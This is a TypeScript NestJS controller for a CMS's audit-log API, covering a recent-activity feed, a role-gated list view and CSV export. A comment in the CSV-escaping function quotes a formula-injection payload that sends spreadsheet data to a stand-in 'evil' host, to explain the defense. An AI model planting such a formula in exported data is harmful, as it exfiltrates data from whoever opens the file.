import { Controller, Get, Query, Request, Res, UseGuards } from '@nestjs/common';
import type { Response } from 'express';
import { PrismaService } from '../prisma/prisma.service';
import { JwtAuthGuard } from '../auth/jwt-auth.guard';
import { RbacGuard } from '../auth/rbac.guard';
import { RequireRoles } from '../auth/roles.decorator';
import { AppRole } from '@cms/database';
import {
  ACTIVITY_ROW_SELECT,
  customerActivityWhere,
  toActivityItems,
  type ActivityRow,
} from './customer-activity-feed';

const ADMIN_ROLES = [AppRole.SUPER_ADMIN, AppRole.DISTRICT_ADMIN, AppRole.SCHOOL_ADMIN] as const;

/** How many rows the dashboard card reads (it groups a publish into one line). */
const RECENT_ACTIVITY_TAKE = 40;

/**
 * Which log a request reads (2026-10-24, owner: "keep the dashboard to only
 * app activity, not backend activity").
 *
 *   'activity' — the customer-facing allowlist (`@cms/api-types`
 *                CUSTOMER_ACTIVITY), written by a person. What every customer
 *                role reads, whatever it asks for.
 *   'all'      — the raw trail: every action, every machine row. SUPER_ADMIN
 *                only, and only when asked for (`?view=all`) — or, for the
 *                owner's existing callers that never pass a view, by default,
 *                so nothing they read today changes.
 *
 * Nothing is deleted either way; the raw rows stay in the table.
 */
export type AuditView = 'activity' | 'all';

export function resolveAuditView(req: any, requested?: string): AuditView {
  const isSuper = req?.user?.role === AppRole.SUPER_ADMIN;
  if (!isSuper) return 'activity';
  return requested === 'activity' ? 'activity' : 'all';
}

function parseDate(value: string | undefined): Date | undefined {
  if (!value) return undefined;
  const d = new Date(value);
  return Number.isNaN(d.getTime()) ? undefined : d;
}

function clampInt(value: string | undefined, def: number, min: number, max: number): number {
  if (!value) return def;
  const n = parseInt(value, 10);
  if (Number.isNaN(n)) return def;
  return Math.min(Math.max(n, min), max);
}

function csvEscape(v: unknown): string {
  if (v === null || v === undefined) return '';
  let s = String(v);
  // CSV formula-injection defense (2026-05-23 launch audit P1):
  // Excel / Numbers / LibreOffice / Google Sheets all interpret a
  // cell starting with `=`, `+`, `-`, `@`, TAB, or CR as a formula.
  // AuditLog `details` JSON can carry user-controlled strings (asset
  // names, playlist names, emails); without prefixing, an admin
  // double-clicking audit-2026-05-23.csv could trigger
  //   =HYPERLINK("https://evil/exfil?d=" & A1)
  // and exfiltrate data. Prefix with a tab so the formula doesn't
  // evaluate but the visible value is still readable. OWASP CSV
  // Injection cheatsheet, same defense Google Sheets uses on import.
  if (/^[=+\-@\t\r]/.test(s)) {
    s = `\t${s}`;
  }
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

@Controller('api/v1/audit')
@UseGuards(JwtAuthGuard, RbacGuard)
export class AuditController {
  constructor(private readonly prisma: PrismaService) {}

  /**
   * The dashboard's "Recent activity" card — customer activity only, for
   * EVERY role including SUPER_ADMIN (it is a customer-facing surface; the
   * owner reads the raw trail on the Activity page's "All events" view).
   *
   * 2026-10-24 — was a BLOCKLIST of device noise that two sweeps (2026-08-31)
   * kept extending and that still leaked every new backend action the day it
   * shipped: the owner's phone showed "Field Build Window Expire ·
   * field_build_window", "Ota Push Held · screen", "Player Field Apk Offer ·
   * screen". It is now the shared ALLOWLIST plus "a person did it"
   * (`customerActivityWhere`), and each row comes back with names resolved
   * (`toActivityItems`) so the card can say "Greg published “Lobby loop” to
   * Lobby TV" instead of "Schedule Created · schedule".
   */
  @Get('recent')
  @RequireRoles(...ADMIN_ROLES)
  async getRecentActivity(@Request() req: any) {
    const tenantId = req.user.tenantId;
    const where = customerActivityWhere({ tenantId });
    const rows = (await this.prisma.client.auditLog.findMany({
      where: where as any,
      take: RECENT_ACTIVITY_TAKE,
      orderBy: { createdAt: 'desc' },
      select: ACTIVITY_ROW_SELECT,
    })) as ActivityRow[];
    return toActivityItems(this.prisma, rows);
  }

  @Get()
  @RequireRoles(...ADMIN_ROLES)
  async list(
    @Request() req: any,
    @Query('from') from?: string,
    @Query('to') to?: string,
    @Query('actorId') actorId?: string,
    @Query('action') action?: string,
    @Query('limit') limitStr?: string,
    @Query('offset') offsetStr?: string,
    // ACC-06 follow-up (2026-08-03) — "everything this key ever did". Declared
    // last so the existing positional call sites keep working.
    @Query('apiKeyId') apiKeyId?: string,
    // 2026-10-24 — 'activity' | 'all'; see `resolveAuditView`. Last, again,
    // so every positional caller keeps working.
    @Query('view') viewRaw?: string,
    // 2026-10-24 — one shelf of the customer allowlist (content, screens,
    // emergency, team, security, settings, …): the Activity page's chips.
    @Query('category') category?: string,
  ) {
    const tenantId = req.user.tenantId;
    const limit = clampInt(limitStr, 50, 1, 200);
    const offset = clampInt(offsetStr, 0, 0, 100000);
    const view = resolveAuditView(req, viewRaw);

    const base = this.buildWhere(tenantId, { from, to, actorId, action, apiKeyId });
    const where = view === 'activity' ? customerActivityWhere(base, action, category) : base;
    // An action customers never see: an empty page, not a query.
    if (!where) return { items: [], total: 0, limit, offset, view };

    const [rows, total] = await Promise.all([
      this.prisma.client.auditLog.findMany({
        where: where as any,
        take: limit,
        skip: offset,
        orderBy: { createdAt: 'desc' },
        include: { user: { select: { email: true, role: true, firstName: true, lastName: true, tenantId: true } } },
      }),
      this.prisma.client.auditLog.count({ where: where as any }),
    ]);

    if (view === 'all') return { items: rows, total, limit, offset, view };
    // Customer rows keep every column they always had (the Settings pages read
    // `details` and `user` off them) and gain the names and facts the Activity
    // page writes its sentences from. Additive: no existing reader changes.
    const activity = await toActivityItems(this.prisma, rows as unknown as ActivityRow[]);
    const items = (rows as any[]).map((row, i) => ({
      ...row,
      category: activity[i]?.category,
      actor: activity[i]?.actor,
      subject: activity[i]?.subject ?? null,
      target: activity[i]?.target ?? null,
      targetKey: activity[i]?.targetKey ?? null,
      facts: activity[i]?.facts ?? {},
    }));
    return { items, total, limit, offset, view };
  }

  @Get('export')
  @RequireRoles(...ADMIN_ROLES)
  async exportCsv(
    @Request() req: any,
    @Res() res: Response,
    @Query('from') from?: string,
    @Query('to') to?: string,
    @Query('actorId') actorId?: string,
    @Query('action') action?: string,
    @Query('apiKeyId') apiKeyId?: string,
    @Query('view') viewRaw?: string,
    @Query('category') category?: string,
  ) {
    const tenantId = req.user.tenantId;
    const base = this.buildWhere(tenantId, { from, to, actorId, action, apiKeyId });
    // The export is the same log the page shows: a customer exports their
    // activity, the owner exports the raw trail.
    const where = resolveAuditView(req, viewRaw) === 'activity' ? customerActivityWhere(base, action, category) : base;

    // Hard cap to protect memory in case the caller omits filters.
    const items = where
      ? await this.prisma.client.auditLog.findMany({
          where: where as any,
          take: 10000,
          orderBy: { createdAt: 'desc' },
          include: { user: { select: { email: true, role: true } } },
        })
      : [];

    // `apiKeyId` is appended rather than slotted next to the actor columns so
    // an existing consumer parsing this CSV by position keeps working.
    const header = ['timestamp', 'actorEmail', 'actorRole', 'action', 'targetType', 'targetId', 'details', 'apiKeyId'];
    const lines = [header.join(',')];
    for (const row of items) {
      lines.push(
        [
          row.createdAt.toISOString(),
          row.user?.email ?? '',
          row.user?.role ?? '',
          row.action,
          row.targetType,
          row.targetId ?? '',
          row.details ?? '',
          row.apiKeyId ?? '',
        ]
          .map(csvEscape)
          .join(','),
      );
    }

    const csv = lines.join('\n');
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader(
      'Content-Disposition',
      `attachment; filename="audit-${new Date().toISOString().slice(0, 10)}.csv"`,
    );
    res.send(csv);
  }

  private buildWhere(
    tenantId: string,
    filters: { from?: string; to?: string; actorId?: string; action?: string; apiKeyId?: string },
  ) {
    const where: any = { tenantId };
    const fromDate = parseDate(filters.from);
    const toDate = parseDate(filters.to);
    if (fromDate || toDate) {
      where.createdAt = {};
      if (fromDate) where.createdAt.gte = fromDate;
      if (toDate) where.createdAt.lte = toDate;
    }
    if (filters.actorId) where.userId = filters.actorId;
    if (filters.action) where.action = filters.action;
    // Still scoped by tenantId above — a key id from another tenant simply
    // matches nothing rather than leaking that tenant's history.
    if (filters.apiKeyId) where.apiKeyId = filters.apiKeyId;
    return where;
  }
}
